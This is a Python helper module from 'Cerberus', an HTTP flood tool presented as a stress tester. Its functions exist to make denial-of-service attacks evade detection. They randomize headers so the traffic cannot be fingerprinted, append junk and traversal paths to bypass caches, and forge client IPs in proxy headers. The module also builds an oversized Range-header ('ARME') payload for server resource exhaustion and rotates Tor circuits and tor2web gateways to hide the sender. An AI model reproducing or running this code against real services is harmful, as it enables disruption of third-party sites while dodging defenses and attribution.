'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import sys, requests, socket, os, urllib3, subprocess

from random import getrandbits, choice, randint, shuffle, randrange
from binascii import hexlify
from netaddr import IPNetwork
from datetime import datetime, timedelta
from tabulate import tabulate
from os.path import join
from urllib.parse import quote, urlparse
from stem import Signal
from stem.control import Controller

from src.core import *
from src.useragent import *
from src.referer import *

# https://stackoverflow.com/questions/13243807/popen-waiting-for-child-process-even-when-the-immediate-child-has-terminated/13256908#13256908
Popen_kwargs = {}
if sys.platform.lower() == 'windows':
    CREATE_NEW_PROCESS_GROUP = 0x00000200  # note: could get it from subprocess
    DETACHED_PROCESS = 0x00000008          # 0x8 | 0x200 == 0x208
    Popen_kwargs.update(creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)  

elif sys.version_info < (3, 2):  # assume posix
    Popen_kwargs.update(preexec_fn=os.setsid)

else:  # Python 3.2+ and Unix
    Popen_kwargs.update(start_new_session=True)

with open(join('src', 'files', 'keywords.txt'), buffering=(16*1024*1024)) as file:
    keywords = file.read().splitlines()

with open(join('src', 'files', 'openredirects.txt'), buffering=(16*1024*1024)) as file:
    openredirects = file.read().splitlines()

class HTTPAdapter(requests.adapters.HTTPAdapter):
    '''
    HTTP adapter which allows socket modification
    '''

    # stolen from stackoverflow xd
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapter, self).init_poolmanager(*args, **kwargs)

class utils():
    def __init__(self):
        self.tor_gateways = [
            'onion.dog',
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

        self.cache_controls = ['no-cache', 'max-age=0', 'no-store', 'no-transform', 'only-if-cached', 'must-revalidate', 'no-transform'] if not Core.bypass_cache else ['no-store', 'no-cache', 'no-transform']
        self.encodings = ['identity', 'gzip', 'deflate', 'compress', 'br']
        self.accept_langs = ["*", "af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
        self.content_types = ['multipart/form-data', 'application/x-url-encoded']
        self.accepts = ['text/plain', '*/*', '/', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*', 'image/jpeg', 'application/x-ms-application', 'image/gif', 'application/xaml+xml', 'image/pjpeg', 'application/x-ms-xbap', 'application/x-shockwave-flash', 'application/msword']
    
    def new_identity(self) -> None:
        '''
        new_identity() -> nothing

        Changes the current TOR circuit

        :returns None: Nothing
        '''

        with Controller.from_port(port=9052) as controller:
            controller.authenticate(password='cerberus')
            controller.signal(Signal.NEWNYM)

    def launch_tor(self, torrc=join('src','files','Tor','torrc')) -> None:
        '''
        launch_tor(torrc location) -> Nothing

        Launches TOR

        :param torrc str: Torrc location
        :returns None: Nothing
        '''

        if Core.is_tor_active:
            return

        args = [join('src','files','Tor','tor.exe'), '-f', torrc] if os.name == 'nt' else ['tor','-f',torrc]
        with open(os.devnull, 'w') as devnull:
            subprocess.Popen(
                args, # command line options
                stdin=devnull, stdout=devnull, stderr=devnull, # redirect everything to os.devnull
                **Popen_kwargs # extra arguments, look at line 38-49 for more info
            ) # launches TOR
        
        Core.is_tor_active = True

    def randhex(self, size=2) -> str:
        '''
        randhex(size) -> hex string

        Creates a random junk hex string

        :param size int: Size
        :returns str: The generated hex string
        '''

        return "".join([f'\\x{choice("0123456789ABCDEF")}{choice("0123456789ABCDEF")}' for _ in range(size)])

    def get_proxy(self, is_requests=True, force_give=False) -> dict | str:
        '''
        get_proxy(is for requests, force give) -> dictionary if for requests, else string

        Gets a random proxy from the "proxy_file" variable that was defined by the user

        :param is_requests bool: Wether to return a dictionary usable for the Requests module
        :param force_give bool: Not used anymore
        '''

        proxy = f'{Core.proxy_proto.lower()}://{choice(Core.proxy_pool)}'
        return {'http': proxy, 'https': proxy} if is_requests else proxy

    def tor_gateway(self) -> str:
        '''
        tor_gateway() -> gateway

        Gets a random Tor2web gateway

        :returns str: Randomly picked gateway
        '''

        shuffle(self.tor_gateways)
        return choice(self.tor_gateways)
    
    def buildsession(self) -> requests.Session:
        '''
        buildession() -> requests Session

        Creates a requests.Session object

        :returns requests.Session: Modified requests session object
        '''

        adapter = HTTPAdapter(socket_options=[
            (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1), 
            (socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5), 
            (socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5), 
            (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        ])

        session = requests.session()
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.verify = False

        return session
    
    def randstr(self, strlen, chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') -> str:
        '''
        randstr(length, allowed characters) -> string

        Function to generate a random string

        :param strlen int: Length of the string
        :param chars str or list: List of characters to pick from
        :returns str: The string
        '''
        
        return ''.join(choice(chars) for _ in range(strlen))
    
    def buildblock(self, url, include=True) -> str:
        '''
        buildblock(url, include the url) -> url with junk data

        Function to generate a block of junk, that gets added to the target url

        :param url str: Url to append data to
        :param include bool: Wether to return the original url aswell
        :returns str: Url with junk data appended to it
        '''

        if url is None: return url
        block = '' if url.endswith('/') else '/'

        if Core.bypass_cache: # generates random pages and search queries

            block += self.randstr(randint(2, 8))
            for _ in range(randint(2, 10)):
                rand = randrange(3)
                if rand == 0: block += f'/{self.randstr(randint(5, 10))}'
                elif rand == 1: block += choice(['/..','\\..','%2F..','%5C..']) # magik
                else: block += f'/{choice(keywords).replace(" ","/")}'
            
            block += f'?{quote(choice(keywords))}={self.randstr(randint(5, 10))}'

            for _ in range(randint(2, 9)):
                if randrange(2) == 1: block += f'&{self.randstr(randint(5, 10))}={quote(choice(keywords))}'
                else: block += f'&{quote(choice(keywords))}={quote(choice(keywords))}'

            if randrange(2) == 0:
                block += f'#{quote(choice(keywords))}' # fragment

            return url+block if include else block
        else:
            return url
        
    def buildarme(self) -> str:
        '''
        buildarme() -> payload

        Builds the payload for the ARME flood, with a random size greater than 1300

        :returns str: ARME payload
        '''

        prefix = 'bytes=0-'
        for i in range(randint(1300, 1500)):
            prefix += f',5-{str(i)}'
        
        return prefix
        
    def builddata(self, length=0) -> tuple:
        '''
        builddata(length) -> (headers, post data)

        Creates a POST body

        :param length int: Approx. length of the payload
        :returns tuple: Headers and post payload
        '''

        if not Core.post_buffer:
            if length == 0:
                length = randint(20,200)

            headers = {}
            if randint(0,1) == 0: # json payload
                json_data = '{'

                for _ in range(length):
                    json_data += f'"{choice([self.randstr(randint(5, 20)), choice(keywords)])}": "{self.randstr(randint(40, 60))}",'
                
                json_data += '}'

                data = json_data        
                headers.update({'Content-Type': 'application/json'})

            else: # url encoded payload 
                url_encoded_data = f'{choice([self.randstr(randint(5, 20)), choice(keywords)])}={choice([self.randstr(randint(5, 20)), choice(keywords)])}'

                while len(url_encoded_data) < length:
                    url_encoded_data += f'&{choice([self.randstr(randint(5, 20)), choice(keywords)])}={choice([self.randstr(randint(5, 20)), choice(keywords)])}'

                data = url_encoded_data
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
            
            return (headers, data)
        else:
            return ({'Content-Type': 'application/x-www-form-urlencoded'}, Core.post_buffer)
    
    def randip(self) -> str:
        '''
        randip() -> random generated IPv4 addresss

        Creates a random IPv4 address

        :returns str: The IP address
        '''

        return '.'.join([str(randint(1,255)) for _ in range(4)])
    
    def randdate(self, strf_format="%a, %w %b %Y %X GMT") -> str:
        '''
        randdate(format) -> randomly generated date

        Creates a random date

        :param strf_format str: Format to pass to "strftime()"
        :returns str: Datetime object, parsed into the specified "strf_format"
        '''

        now = datetime.now() # get the current date

        # add or remove some years
        if randrange(2) == 0: now += timedelta(days=365*randint(1,40))
        else: now -= timedelta(days=365*randint(1,40))

        # add or remove some days
        if randrange(2) == 0: now += timedelta(days=randint(1, 365))
        else: now -= timedelta(days=randint(1, 365))

        # add or remove some hours
        if randrange(2) == 0: now += timedelta(hours=randint(1, 24))
        else: now -= timedelta(hours=randint(1, 24))

        # and add or remove some seconds
        if randrange(2) == 0: now += timedelta(seconds=randint(1, 60))
        else: now -= timedelta(seconds=randint(1, 60))

        return now.strftime(strf_format)
    
    def buildcookie(self, size=0) -> str:
        '''
        buildcookie(size) -> cookie

        Creates a random cookie, size is more a limit of the "randomization"
        
        :param size int: Approx. size of the cookie
        :returns str: The cookie, tasty
        '''

        def giveint():
            if size == 0:
                return randint(1,1000)

            return size

        cookie = choice([
            self.randstr(giveint(), chars='QWERTYUIOPASDFGHJKLZXCVBNM01234567890'),
            f'_ga=GA{str(giveint())} _gat=1;{(self.randstr(giveint()))}; __cfduid={self.randstr(giveint(), chars="qwertyuiopasdfghjklzxcvbnm0123456789")}; {self.randstr(giveint())}={self.randstr(giveint())}'
            f'id={self.randstr(giveint())}',
            f'PHPSESSID={self.randstr(giveint())}; csrftoken={self.randstr(giveint())}; _gat={str(giveint())}',
            f'cf_chl_2={self.randstr(giveint())}; cf_chl_prog=x11; cf_clearance={self.randstr(giveint())}',
            f'__cf_bm={self.randstr(giveint())}; __cf_bm={self.randstr(giveint())}',
            f'language=en; AKA_A2={self.randstr(giveint())}; {self.randstr(giveint())}={str(giveint())}; AMCV_{self.randstr(giveint())}={self.randstr(giveint())}; ak_bmsc={self.randstr(giveint(), chars="QWERTYUIOPASDFGHJKLZXCVBNM")}~{self.randstr(giveint())}'
        ])

        # add a expiration date to the cookie
        if randrange(2) == 0:
            cookie += f'; Expires={self.randdate()};'

        return cookie

        
    def buildheaders(self, url, if_socket=False) -> dict | str:
        '''
        buildheaders(url, if socket) -> headers

        Function to generate randomized headers, which in result makes the attack unfingerprintable

        :param url str: Url to grab certain information from
        :param if_socket bool: Wether to return the data in format thats easy to use with raw sockets
        :returns dict or str: Dictionary if `if_socket` is False, else string
        '''

        # we shuffle em
        for toshuffle in [self.cache_controls, self.encodings, self.content_types, self.accepts]:
            shuffle(toshuffle)
        
        parsed = urlparse(url)

        headers = choice([ # chooses between XMLHttpRequest and a random/predefined useragent
            {'User-Agent': urllib3.util.SKIP_HEADER, 'X-Requested-With': 'XMLHttpRequest'} if not if_socket else {'X-Requested-With': 'XMLHttpRequest'},  # SKIP_HEADER makes urllib3 ignore the header, this basically removes the User-Agent header from the list
            {'User-Agent': getAgent()}
        ])

        if randrange(2) == 1:
            headers.update({
                'X-Forwarded-Proto': 'Http',
                'X-Forwarded-Host': f'{urlparse(url).netloc}, {self.randip()}',
            })

        headers.update({ # default headers
            'Cache-Control': ', '.join([ choice(self.cache_controls) for _ in range( randint(1, 3) ) ]),
            'Accept-Encoding': ', '.join([ choice(self.encodings) for _ in range( randint(1, 3) ) ]),
            'Accept': ', '.join([ choice(self.accepts) for _ in range( randint(1, 3) ) ]),
            'Accept-Language':  ', '.join([ choice(self.accept_langs) for _ in range( randint(1, 3) ) ]),
        })

        if randrange(2) == 1: headers.update({'Content-Encoding': choice(self.encodings)})
        if randrange(2) == 1:
            headers.update({
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Sec-Gpc': '1'
            })

        if randrange(2) == 1: headers.update({'Referer': self.buildblock(getReferer())}) # adds a referer
        if randrange(3) == 1: headers.update({'Origin': url})
        if randrange(2) == 1: headers.update({'Upgrade-Insecure-Requests': '1'}) # upgrade insecure requests to https

        proxychoice = randrange(3) # chooses a random "proxy" header
        if proxychoice == 0: headers.update({choice(['Via','Client-IP','Real-IP']): ', '.join([ self.randip() for _ in range( randint(1, 3) ) ]) }) # fakes the source ip
        elif proxychoice == 1: headers.update({'X-Forwarded-For': ', '.join([ self.randip() for _ in range( randint(1, 3) ) ])})
        else: pass

        if randrange(2) == 1: headers.update({'DNT': '1'}) # do-not-track
        if randrange(2) == 1: headers.update({'Cookie': self.buildcookie()}) # adds a fake cookie

        authchoice = randrange(5) # pick a random authentication header and append it to the dictionary
        if authchoice == 0: headers.update({'Proxy-Authorization': f'Basic {self.randstr(randint(5,10))}='}) # proxy authentication
        elif authchoice == 1: headers.update({'Authorization': f'Basic {self.randstr(randint(5,10))}='}) # basic authentication
        elif authchoice == 2: headers.update({'Authorization': f'Digest username={choice(keywords).replace(" ","_")}, realm="http-auth@{parsed.netloc}", uri="{self.buildblock(url, False)}", algorithm={choice(["MD5","SHA-256","SHA-512"])}, nonce="{self.randstr(randint(20,40))}", nc={str(randint(1,1000))}, cnonce="{self.randstr(randint(20,40))}", qop="{choice(["auth","auth-int","auth, auth-int"])}", response="{self.randstr(randint(20,40))}", opaque="{self.randstr(randint(20,40))}"'}) # digest authentication
        else: pass

        if Core.random_headers: headers.update(choice(Core.random_headers))

        if if_socket:
            socket_headers = ''
            for key, value in headers:
                socket_headers += f'{key}: {value}\r\n'
            
            return socket_headers
            
        return headers
    
    def clear(self) -> None:
        '''
        clear() -> Nothing

        Clears the screen

        :returns None: Nothing
        '''

        try:
            if os.name == 'nt': os.system('cls')
            else: os.system('clear')
        except:
            print('\n'*400) # backup method

    def make_id(self) -> str:
        '''
        make_id() -> random id

        Helper function to make attack ID's

        :returns str: The random ID
        '''

        return hexlify(getrandbits(128).to_bytes(16, 'little')).decode() # make a simple 32 characters long ID
    
    def valid_ip(self, ip) -> bool:
        '''
        valid_ip(ipv4 or ipv6 address) -> true if valid, false if invalid

        Checks if the specified IPv4/IPv6 address is valid

        :param ip str: IPv4 or IPv6 address
        :returns bool: True if its a valid IP address, False if otherwise
        '''

        return bool(Core.ipregex.match(ip))
        
    def cidr2iplist(self, cidrange) -> list:
        '''
        cidr2iplist(cidrange) -> list of IP address

        Converts a CID range to a list of IP's

        :param cidrange str: CID range
        :returns str: List of IP addresses, parsed from the given range
        '''

        return [str(ip) for ip in IPNetwork(cidrange)]

    def unix2posix(self, timestamp) -> str:
        '''
        unix2posix(unix timestamp) -> posix timestamp

        Converts the specified UNIX timestamp into a POSIX one

        :param timestamp float: UNIX timestamp
        :returns str: UNIX timestamp, converted to a POSIX one
        '''

        return datetime.fromtimestamp(timestamp).strftime('%m/%d/%Y, %H:%M:%S')
    
    def posix2unix(self, timestamp) -> float:
        '''
        posix2unix(posix timestamp) -> unix timestamp

        Converts the specified POSIX timestamp into a UNIX one

        :param timestamp str: POSIX timestamp
        :returns float: UNIX timestamp
        '''

        return datetime.timestamp(datetime.strptime(timestamp, "%m/%d/%Y, %H:%M:%S"))
    
    def table(self, rows, headers) -> str:
        '''
        table(list of rows, list of headers) -> table

        Creates a nice looking table

        :param rows list: List of Rows
        :param headers list: List of headers
        :returns str: The table
        '''

        return tabulate(rows, headers=headers, tablefmt='simple')
    
    def Sec2Str(self, sec) -> str: # found it on stackoverflow, cheers Timothy C. Quinn
        '''
        Sec2Str(seconds) -> output

        Turns seconds into days, hours, minutes and seconds and puts that into a single string

        :param seconds int: Seconds to convert
        :returns str: The seconds, converted into days/hours/minutes and seconds
        '''

        td = timedelta(seconds=sec)
        def __t(t, n):
            if t < n: return (t, 0)
            v = t//n
            return (t -  (v * n), v)
            
        (s, h) = __t(td.seconds, 3600)
        (s, m) = __t(s, 60)    

        result = {
            'days': td.days,
            'hours': h,
            'minutes': m,
            'seconds': s,
        }

        result = ''
        if td.days != 0: result += f'{td.days} {"days" if td.days != 1 else "day"}, '
        if h != 0: result += f'{h} {"hours" if h != 1 else "hour"}, '
        if m != 0: result += f'{m} {"minutes" if m != 1 else "minutes"}, '
        
        result += f'{s} {"seconds" if s != 1 else "second"}'

        return result
    
    def print_banner(self) -> None:
        '''
        print_banner() -> Nothing

        Prints the banner

        :returns None: Nothing
        '''

        print(r'''
   sSSs    sSSs   .S_sSSs     .S_SSSs      sSSs   .S_sSSs     .S       S.     sSSs  
 d%%SP   d%%SP  .SS~YS%%b   .SS~SSSSS    d%%SP  .SS~YS%%b   .SS       SS.   d%%SP  
d%S'    d%S'    S%S   `S%b  S%S   SSSS  d%S'    S%S   `S%b  S%S       S%S  d%S'    
S%S     S%S     S%S    S%S  S%S    S%S  S%S     S%S    S%S  S%S       S%S  S%|     
S&S     S&S     S%S    d*S  S%S SSSS%P  S&S     S%S    d*S  S&S       S&S  S&S     
S&S     S&S_Ss  S&S   .S*S  S&S  SSSY   S&S_Ss  S&S   .S*S  S&S       S&S  Y&Ss    
S&S     S&S~SP  S&S_sdSSS   S&S    S&S  S&S~SP  S&S_sdSSS   S&S       S&S  `S&&S   
S&S     S&S     S&S~YSY%b   S&S    S&S  S&S     S&S~YSY%b   S&S       S&S    `S*S  
S*b     S*b     S*S   `S%b  S*S    S&S  S*b     S*S   `S%b  S*b       d*S     l*S  
S*S.    S*S.    S*S    S%S  S*S    S*S  S*S.    S*S    S%S  S*S.     .S*S    .S*P  
 SSSbs   SSSbs  S*S    S&S  S*S SSSSP    SSSbs  S*S    S&S   SSSbs_sdSSS   sSS*S   
  YSSP    YSSP  S*S    SSS  S*S  SSY      YSSP  S*S    SSS    YSSP~YSSY    YSS'    
                SP          SP                  SP > Created by  https://github.com/Nexuzzzz                                
                Y           Y                   Y  > Licensed under GPLV3
''')